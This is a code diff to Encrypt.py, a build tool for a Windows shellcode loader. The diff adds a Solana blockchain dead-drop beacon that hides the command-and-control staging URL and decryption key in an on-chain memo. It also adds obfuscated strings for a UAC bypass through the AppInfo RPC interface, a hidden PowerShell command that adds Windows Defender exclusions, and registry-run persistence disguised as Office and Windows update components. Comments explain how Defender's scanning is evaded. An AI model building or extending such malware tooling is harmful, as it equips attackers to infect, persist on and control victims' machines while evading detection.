@@ -3,23 +3,45 @@
 Encrypt.py - Shellcode Encryption & Build Randomizer
 
 Usage:
-  python Encrypt.py <shellcode.bin> --url https://your-server/payload.dat
-  python Encrypt.py <shellcode.bin> --url https://your-server/foo.bin --out custom.bin
+  python Encrypt.py <shellcode.bin> --url https://your-server/payload.dat --sol-wallet <ADDRESS>
+  python Encrypt.py <shellcode.bin> --url https://your-server/foo.bin --sol-wallet <ADDRESS> \\
+        [--out custom.bin] [--rpc https://api.devnet.solana.com]
 
 Generates:
   <basename-of-url>  - LZNT1-compressed + Chaskey-CTR-encrypted shellcode.
-                       Defaults to the URL's last path component (e.g. payload.dat),
-                       so the file you upload to your C2 matches the URL the loader
-                       fetches at runtime. Override with --out if needed.
-  Payload.h          - Encryption params + randomized string obfuscation.
+                       Filename matches the URL's last path component so the file
+                       you upload to your C2 already has the right name.
+                       Override with --out if needed.
+  Payload.h          - SOL wallet address (XOR-obfuscated) + per-build randomized
+                       string keys and placement XOR key. NO URL or crypto key is
+                       embedded in the binary.
+  memo.txt           - The exact string to post as a Solana memo instruction from
+                       the wallet address above (its FIRST / oldest transaction).
+                       Format: <url>|<32-hex-key>|<24-hex-nonce>
+                       The loader fetches this at runtime via the Solana JSON-RPC
+                       API, parses URL + key + nonce, then downloads and decrypts
+                       the payload. Rotating the key just means posting a new
+                       transaction and re-running Encrypt.py — no rebuild needed.
+
+Beacon flow:
+  1. Run Encrypt.py  → encrypted payload + Payload.h + memo.txt
+  2. Upload payload  → staging server at the URL you provided
+  3. Post memo.txt   → send a Solana transaction from <sol-wallet> with the memo
+  4. build.bat       → binary with wallet address only; URL+key live on-chain
 """
 
 import sys
 import os
+import re
 import random
 import struct
 
-# All sensitive strings — 4-byte rotating XOR key randomized each run
+
+# -----------------------------------------------------------------------
+# All sensitive strings — 4-byte rotating XOR key, randomized each run.
+# Key bytes are chosen so no XOR produces 0x00 at any character position,
+# keeping the null terminator as a reliable DEOBF() sentinel in C.
+# -----------------------------------------------------------------------
 OBFUSCATED_STRINGS = {
     # Evasion.c
     "XSTR_NTDLL_DLL":               "ntdll.dll",
@@ -80,6 +102,64 @@ OBFUSCATED_STRINGS = {
     # GhostHollow.c (FILE_FLAG_DELETE_ON_CLOSE-backed image section — no NTFS
     # transaction, so Defender's MpFilter transaction-aware scanner is blind)
     "XSTR_DELETE_FILE_A":           "DeleteFileA",
+    # Uac.c (AppInfo RPC UAC bypass — compiled only for UAC builds)
+    # ncalrpc transport for the AppInfo RPC binding
+    "XSTR_NCALRPC":                 "ncalrpc",
+    # AppInfo service interface UUID {201ef99a-7fa0-444c-9399-19ba84f12a1a}
+    "XSTR_APPINFO_UUID":            "201ef99a-7fa0-444c-9399-19ba84f12a1a",
+    # WinStation for child-process lpDesktop
+    "XSTR_WINSTA_DEFAULT":          "WinSta0\\Default",
+    # Filename suffixes appended to GetSystemDirectoryW result
+    "XSTR_WINVER_EXE":              "\\winver.exe",
+    "XSTR_COMPUTERDEFAULTS_EXE":    "\\ComputerDefaults.exe",
+    # PowerShell WD-exclusion command pieces
+    "XSTR_PS_EXE":                  "powershell.exe",
+    "XSTR_WD_PS_FLAGS":             " -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath '",
+    "XSTR_WD_CMD_SUFFIX":           "'\"",
+    # rpcrt4.dll RPC functions (resolved dynamically, no static import)
+    "XSTR_RPCRT4_DLL":              "rpcrt4.dll",
+    "XSTR_RPC_STRING_BIND_COMP":    "RpcStringBindingComposeW",
+    "XSTR_RPC_BIND_FROM_STR":       "RpcBindingFromStringBindingW",
+    "XSTR_RPC_STRING_FREE":         "RpcStringFreeW",
+    "XSTR_RPC_BIND_SET_AUTH":       "RpcBindingSetAuthInfoExW",
+    "XSTR_RPC_ASYNC_INIT":          "RpcAsyncInitializeHandle",
+    "XSTR_RPC_ASYNC_COMPLETE":      "RpcAsyncCompleteCall",
+    "XSTR_RPC_BIND_FREE":           "RpcBindingFree",
+    "XSTR_NDR_ASYNC_CALL":          "NdrAsyncClientCall",
+    "XSTR_NDR_OLE_ALLOC":           "NdrOleAllocate",
+    "XSTR_NDR_OLE_FREE":            "NdrOleFree",
+    "XSTR_CREATE_WELL_KNOWN_SID":   "CreateWellKnownSid",
+    # Install.c (first-run installer — UAC builds)
+    "XSTR_APPDATA_VAR":             "APPDATA",
+    "XSTR_INSTALL_SUBDIR":          "\\Microsoft\\Office\\Updates\\",
+    "XSTR_PERSIST_EXE_NAME":        "msoia.exe",
+    "XSTR_STARTUP_VALUE_NAME":      "Office Telemetry Agent",
+    "XSTR_STARTUP_APPROVED_KEY":    "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run",
+    "XSTR_GET_ENV_VAR_A":           "GetEnvironmentVariableA",
+    "XSTR_CREATE_DIRECTORY_A":      "CreateDirectoryA",
+    "XSTR_SET_FILE_ATTR_A":         "SetFileAttributesA",
+    # Registry functions (advapi32 — A-suffix, used by Install.c with ANSI paths)
+    "XSTR_REG_OPEN_KEY_EX_A":       "RegOpenKeyExA",
+    "XSTR_REG_CREATE_KEY_EX_A":     "RegCreateKeyExA",
+    "XSTR_REG_SET_VALUE_EX_A":      "RegSetValueExA",
+    "XSTR_REG_CLOSE_KEY":           "RegCloseKey",
+    # Persist.c + legacy (registry — compiled for all/UAC builds)
+    "XSTR_ADVAPI32_DLL":            "advapi32.dll",
+    "XSTR_WD_EXCL_PATH":            "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
+    "XSTR_RUN_KEY_PATH":            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+    "XSTR_PERSIST_NAME":            "WUAssistant",
+    # Solana.c — blockchain C2 beacon
+    # Host for JSON-RPC calls to fetch the memo that carries URL + key.
+    # Obfuscated so the string "solana.com" never appears in plain text.
+    "XSTR_SOL_RPC_HOST":            "api.mainnet-beta.solana.com",
+    # Prefix emitted by the SPL Memo program in transaction log messages:
+    #   "Program log: <memo text>"
+    # Used to locate the memo inside a getTransaction JSON response.
+    "XSTR_SOL_MEMO_PFX":            "Program log: ",
+    # InternetConnectA / HttpOpenRequestA need "POST" for JSON-RPC
+    "XSTR_HTTP_POST":               "POST",
+    # Content-Type header sent with Solana JSON-RPC requests
+    "XSTR_JSON_CONTENT_TYPE":       "Content-Type: application/json",
 }
 
 
@@ -173,17 +253,6 @@ def lznt1_compress(data):
     return bytes(out_buf[:final_size.value])
 
 
-# ---- Key Protection ----
-
-def generate_protected_key(key):
-    """Protect key with reversible transformation. Requires brute-forcing 1 byte."""
-    b = random.randint(1, 255)
-    protected = bytearray()
-    for i, byte_val in enumerate(key):
-        protected.append(((byte_val + i) ^ b) & 0xFF)
-    return bytes(protected), b
-
-
 # ---- String Obfuscation (4-byte rotating XOR key) ----
 
 def pick_xor_keys(strings_dict):
@@ -243,17 +312,51 @@ def derive_output_filename(url: str) -> str:
     return name
 
 
+# Solana base-58 alphabet (same as Bitcoin — no 0, O, I, l)
+_B58_ALPHABET = re.compile(r'^[1-9A-HJ-NP-Za-km-z]{32,44}$')
+
+def validate_sol_wallet(address: str) -> bool:
+    """Basic sanity check: base58 chars, 32-44 characters long.
+    Solana public keys are 32 bytes; in base58 that encodes to 43 or 44
+    characters for a typical non-zero key. We accept 32-44 to be safe."""
+    return bool(_B58_ALPHABET.match(address))
+
+
 def main():
-    if len(sys.argv) < 4 or "--url" not in sys.argv:
-        print(f"Usage: {sys.argv[0]} <shellcode.bin> --url https://server/payload.dat [--out <file>]")
+    if len(sys.argv) < 2 or "--url" not in sys.argv or "--sol-wallet" not in sys.argv:
+        print(
+            f"Usage: {sys.argv[0]} <shellcode.bin> "
+            "--url https://server/payload.dat "
+            "--sol-wallet <ADDRESS> "
+            "[--out <file>] "
+            "[--rpc https://api.mainnet-beta.solana.com]"
+        )
         sys.exit(1)
 
     shellcode_path = sys.argv[1]
+
     idx = sys.argv.index("--url")
     staging_url = sys.argv[idx + 1]
 
-    # Explicit --out overrides URL-derived name. The default — URL basename —
-    # is what most operators want: encrypt → upload as-is, no rename step.
+    idx = sys.argv.index("--sol-wallet")
+    sol_wallet = sys.argv[idx + 1]
+
+    # Optional: custom RPC endpoint (devnet / testnet / private node)
+    rpc_host = "api.mainnet-beta.solana.com"
+    if "--rpc" in sys.argv:
+        from urllib.parse import urlparse
+        rpc_url_arg = sys.argv[sys.argv.index("--rpc") + 1]
+        parsed_rpc = urlparse(rpc_url_arg)
+        if parsed_rpc.hostname:
+            rpc_host = parsed_rpc.hostname
+
+    # Validate wallet address (base58, 32-44 chars)
+    if not validate_sol_wallet(sol_wallet):
+        print(f"[!] Invalid Solana wallet address: '{sol_wallet}'")
+        print("    Expected base58 string, 32-44 characters")
+        sys.exit(1)
+
+    # --out overrides URL-derived filename
     out_name = None
     if "--out" in sys.argv:
         out_name = sys.argv[sys.argv.index("--out") + 1]
@@ -263,7 +366,10 @@ def main():
     with open(shellcode_path, "rb") as f:
         shellcode = f.read()
 
-    print(f"[*] Shellcode: {len(shellcode)} bytes ({len(shellcode)/1024/1024:.1f} MB)")
+    print(f"[*] Shellcode:   {len(shellcode)} bytes ({len(shellcode)/1024/1024:.1f} MB)")
+    print(f"[*] SOL wallet:  {sol_wallet}")
+    print(f"[*] RPC host:    {rpc_host}")
+    print(f"[*] Staging URL: {staging_url}")
 
     # --- LZNT1 Compression ---
     compressed = lznt1_compress(shellcode)
@@ -282,13 +388,11 @@ def main():
 
     # --- Chaskey-CTR Encryption ---
     key_size = 16
-    chaskey_key = bytes(random.randint(0, 255) for _ in range(key_size))
+    chaskey_key   = bytes(random.randint(0, 255) for _ in range(key_size))
     chaskey_nonce = bytes(random.randint(0, 255) for _ in range(12))
-    hint_byte = chaskey_key[0]
 
     print(f"[*] Encrypting with Chaskey-CTR...")
     encrypted = chaskey_ctr_crypt(payload_data, chaskey_key, chaskey_nonce)
-    protected_key, brute_byte = generate_protected_key(chaskey_key)
 
     script_dir = os.path.dirname(os.path.abspath(__file__))
 
@@ -299,52 +403,94 @@ def main():
         f.write(encrypted)
     print(f"[+] {out_name}: {len(encrypted)} bytes")
 
-    # Pick random 4-byte XOR key for string obfuscation
+    # --- Build the on-chain memo ---
+    # Format: <url>|<32-hex-key>|<24-hex-nonce>|<original-size>|<compression-flag>
+    #
+    # Fields:
+    #   url               staging server path for the encrypted payload
+    #   32-hex-key        Chaskey-CTR key (16 bytes, hex-encoded)
+    #   24-hex-nonce      Chaskey-CTR nonce (12 bytes, hex-encoded)
+    #   original-size     uncompressed shellcode size (decimal); needed by
+    #                     RtlDecompressBuffer to allocate the output buffer
+    #   compression-flag  '1' if LZNT1-compressed before encryption, '0' otherwise
+    #
+    # Including size + compression in the memo means the binary contains NO
+    # payload-specific data at all — the same build can decrypt any future
+    # payload without recompiling.
+    memo = (
+        f"{staging_url}"
+        f"|{chaskey_key.hex()}"
+        f"|{chaskey_nonce.hex()}"
+        f"|{len(shellcode)}"
+        f"|{1 if use_compression else 0}"
+    )
+
+    memo_path = os.path.join(script_dir, "memo.txt")
+    with open(memo_path, "w") as f:
+        f.write(memo + "\n")
+    print(f"[+] memo.txt: {len(memo)} chars")
+
+    # --- Pick random 4-byte XOR key for string obfuscation ---
     xkeys = pick_xor_keys(OBFUSCATED_STRINGS)
     print(f"[+] XKEY: [{', '.join(f'0x{k:02X}' for k in xkeys)}]")
 
-    # XOR-encode the URL with its own random key
-    url_bytes = staging_url.encode() + b'\x00'
-    url_xor_key = random.randint(1, 255)
-    xored_url = bytes([(b ^ url_xor_key) & 0xFF for b in url_bytes])
+    # --- XOR-encode the wallet address (single-byte key, same scheme as old URL) ---
+    wallet_bytes = sol_wallet.encode('ascii') + b'\x00'
+    wallet_xor_key = random.randint(1, 255)
+    xored_wallet = bytes([(b ^ wallet_xor_key) & 0xFF for b in wallet_bytes])
+
+    # --- XOR-encode the RPC host (used by Solana.c, separate single-byte key) ---
+    rpc_bytes = rpc_host.encode('ascii') + b'\x00'
+    rpc_xor_key = random.randint(1, 255)
+    # Ensure no null collision: key must not equal any byte in rpc_host
+    rpc_host_byte_set = set(rpc_bytes[:-1])  # exclude the null terminator
+    while rpc_xor_key in rpc_host_byte_set:
+        rpc_xor_key = random.randint(1, 255)
+    xored_rpc = bytes([(b ^ rpc_xor_key) & 0xFF for b in rpc_bytes])
+
+    # Per-build 16-byte XOR key for Phantom/Ghost placement write encryption.
+    placement_xor = bytes(random.randint(0, 255) for _ in range(16))
 
     # --- Generate Payload.h ---
     lines = []
     lines.append("#pragma once")
     lines.append("")
-    lines.append("// Auto-generated by Encrypt.py \u2014 do not edit")
+    lines.append("// Auto-generated by Encrypt.py — do not edit")
     lines.append("// Randomized values change every build")
     lines.append("")
-    lines.append(f"#define PAYLOAD_SIZE    {len(shellcode)}")
+    lines.append("// ---- Fixed crypto constant ----")
     lines.append(f"#define KEY_SIZE        {key_size}")
-    lines.append(f"#define HINT_BYTE       0x{hint_byte:02X}")
-    lines.append(f"#define URL_XOR_KEY     0x{url_xor_key:02X}")
-    lines.append(f"#define URL_LENGTH      {len(url_bytes)}")
-    lines.append(f"#define USE_COMPRESSION {1 if use_compression else 0}")
+    lines.append("// NOTE: PAYLOAD_SIZE and USE_COMPRESSION are NO LONGER compiled in.")
+    lines.append("// They travel in the on-chain memo so any future payload (different")
+    lines.append("// size or compression) works with the same binary, no rebuild needed.")
     lines.append("")
-    # Per-build 16-byte XOR key for Phantom/Ghost placement write encryption.
-    # The decrypted shellcode is XOR'd against this key BEFORE being written
-    # to the transacted/delete-on-close file (Defender's MpFilter sees garbage),
-    # then decrypted in-place AFTER NtMapViewOfSection by flipping protection
-    # to RW and XOR'ing again, then flipping back to RX/RWX.
-    placement_xor = bytes(random.randint(0, 255) for _ in range(16))
+    lines.append("// ---- Solana beacon ----")
+    lines.append("// Wallet whose FIRST (oldest) transaction carries the memo:")
+    lines.append("//   <staging_url>|<32-hex-key>|<24-hex-nonce>")
+    lines.append("// The loader resolves the URL and decryption key at runtime via")
+    lines.append("// the Solana JSON-RPC API. No URL or key is embedded in the binary.")
+    lines.append(f"#define SOL_WALLET_XOR_KEY  0x{wallet_xor_key:02X}")
+    lines.append(f"#define SOL_WALLET_LEN      {len(wallet_bytes)}")
+    lines.append(format_initializer("INIT_SOL_WALLET", xored_wallet))
+    lines.append("")
+    lines.append("// RPC host (XOR-obfuscated, separate key from wallet)")
+    lines.append(f"#define SOL_RPC_XOR_KEY     0x{rpc_xor_key:02X}")
+    lines.append(f"#define SOL_RPC_HOST_LEN    {len(rpc_bytes)}")
+    lines.append(format_initializer("INIT_SOL_RPC_HOST", xored_rpc))
+    lines.append("")
+    lines.append("// ---- Per-build 16-byte write-encryption key ----")
+    lines.append("// Phantom.c / GhostHollow.c XOR shellcode before writing to the")
+    lines.append("// transacted / delete-on-close file (MpFilter sees garbage).")
     lines.append(format_initializer("INIT_PLACEMENT_XOR_KEY", placement_xor))
     lines.append("#define PLACEMENT_XOR_KEY_LEN 16")
     lines.append("")
-    lines.append("// 4-byte string obfuscation key (randomized per build)")
+    lines.append("// ---- 4-byte string obfuscation key (randomized per build) ----")
     for i, k in enumerate(xkeys):
         lines.append(f"#define XKEY_{i}          0x{k:02X}")
     lines.append("")
-    lines.append(format_initializer("INIT_ENCODED_URL", xored_url))
-    lines.append("")
-    lines.append(format_initializer("INIT_PROTECTED_KEY", protected_key))
-    lines.append("")
-    lines.append("// Chaskey-CTR nonce (12 bytes)")
-    lines.append(format_initializer("INIT_CHASKEY_NONCE", chaskey_nonce))
-    lines.append("")
 
     # Obfuscated API/DLL strings
-    lines.append("// Obfuscated strings (4-byte rotating XOR, randomized per build)")
+    lines.append("// ---- Obfuscated strings (4-byte rotating XOR, randomized per build) ----")
     for name, plaintext in OBFUSCATED_STRINGS.items():
         encoded = xor_encode_string(plaintext, xkeys)
         lines.append(format_initializer(name, encoded))
@@ -354,16 +500,8 @@ def main():
         f.write("\n".join(lines) + "\n")
     print(f"[+] Payload.h generated")
 
-    # --- Verify encryption ---
-    recovered = bytearray()
-    b = 0
-    while ((protected_key[0] ^ b) - 0) != hint_byte:
-        b += 1
-    for i in range(key_size):
-        recovered.append(((protected_key[i] ^ b) - i) & 0xFF)
-    assert bytes(recovered) == chaskey_key, "Key recovery failed"
-
-    decrypted = chaskey_ctr_crypt(encrypted, bytes(recovered), chaskey_nonce)
+    # --- Verify encryption round-trip ---
+    decrypted = chaskey_ctr_crypt(encrypted, chaskey_key, chaskey_nonce)
     assert decrypted == payload_data, "Decryption verification failed"
     print(f"[+] Encryption verification PASSED")
 
@@ -382,16 +520,33 @@ def main():
         assert bytes(out_buf[:final_size.value]) == shellcode
         print(f"[+] Compression verification PASSED")
 
+    # Verify wallet XOR round-trip
+    recovered_wallet = bytes([(b ^ wallet_xor_key) & 0xFF for b in xored_wallet[:-1]])
+    assert recovered_wallet.decode('ascii') == sol_wallet, "Wallet XOR verification failed"
+    print(f"[+] Wallet obfuscation verified")
+
     # Verify string obfuscation
-    first_name = list(OBFUSCATED_STRINGS.keys())[0]
+    first_name  = list(OBFUSCATED_STRINGS.keys())[0]
     first_plain = OBFUSCATED_STRINGS[first_name]
     first_encoded = xor_encode_string(first_plain, xkeys)
     for i, byte_val in enumerate(first_encoded[:-1]):
         assert (byte_val ^ xkeys[i % 4]) == first_plain.encode('ascii')[i]
     print(f"[+] String obfuscation verified")
 
-    print(f"\n[*] Upload {out_name} to: {staging_url}")
+    # --- Summary ---
+    print()
+    print("=" * 60)
+    print(f"[*] Upload '{out_name}' to: {staging_url}")
+    print()
+    print(f"[*] Post the following memo as the FIRST Solana transaction")
+    print(f"    from wallet: {sol_wallet}")
+    print()
+    print(f"    {memo}")
+    print()
+    print(f"    (also saved to memo.txt)")
+    print()
     print(f"[*] Then build: build.bat")
+    print("=" * 60)
 
 
 if __name__ == "__main__":
